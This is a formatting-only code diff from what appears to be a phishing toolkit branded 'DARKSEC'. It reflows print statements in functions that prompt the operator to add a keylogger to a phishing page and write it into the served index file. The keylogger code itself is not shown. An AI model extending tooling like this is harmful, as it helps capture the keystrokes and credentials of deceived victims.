@@ -20,10 +20,14 @@ def add_keylogger_prompt():
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**'''.format(default_palette[0], default_palette[2]))
-    print("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(default_palette[0], default_palette[4]))
-    print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(default_palette[0], default_palette[4]))
-    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(default_palette[0], default_palette[4]))
-    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(default_palette[0], default_palette[4], default_palette[2])).upper()
+    print("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------".format(
+        default_palette[0], default_palette[4]))
+    print("\n{0}[{1}!{0}]{1}ATTENTION: Adding Keylogger Mostly Kills the Tunnel Connection.\n".format(
+        default_palette[0], default_palette[4]))
+    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)".format(
+        default_palette[0], default_palette[4]))
+    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(
+        default_palette[0], default_palette[4], default_palette[2])).upper()
     if choice == 'Y':
         add_keylogger()
     else:
@@ -39,7 +43,8 @@ def add_keylogger():
         f = open('Server/www/index.html', 'w')
         f.write(c)
         f.close()
-        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
+        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(
+            default_palette[0], default_palette[4]))
         wait(2)
     else:
         with open('Server/www/index.php') as f:
@@ -49,6 +54,6 @@ def add_keylogger():
         f = open('Server/www/index.php', 'w')
         f.write(c)
         f.close()
-        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(default_palette[0], default_palette[4]))
+        print("\n{0}[{1}#{0}]Keylogger{0} ADDED !!!".format(
+            default_palette[0], default_palette[4]))
         wait(2)
-
